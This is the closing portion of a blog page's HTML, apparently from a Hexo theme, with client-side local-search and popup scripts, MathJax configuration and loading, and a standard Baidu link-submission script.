                            var end = first_occur + 80;
                            if(start < 0){
                                start = 0;
                            }
                            if(start == 0){
                                end = 50;
                            }
                            if(end > content.length){
                                end = content.length;
                            }
                            var match_content = content.substring(start, end);
                            // highlight all keywords
                            keywords.forEach(function(keyword){
                                var regS = new RegExp(keyword, "gi");
                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
                            });

                            str += "<p class=\"search-result\">" + match_content +"...</p>"
                        }
                        str += "</li>";
                    }
                })};
                str += "</ul>";
                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
                $resultContent.innerHTML = str;
            });
            proceedsearch();
        }
    });}

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched == false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };

    });

    $('.popup-btn-close').click(function(e){
      $('.popup').hide();
      $(".popoverlay").remove();
      $('body').css('overflow', '');
    });
    $('.popup').click(function(e){
      e.stopPropagation();
    });
  </script>


  
  <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
  </script>

  <script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for (i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';
      }
    });
  </script>
  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->


  


</body>
</html>
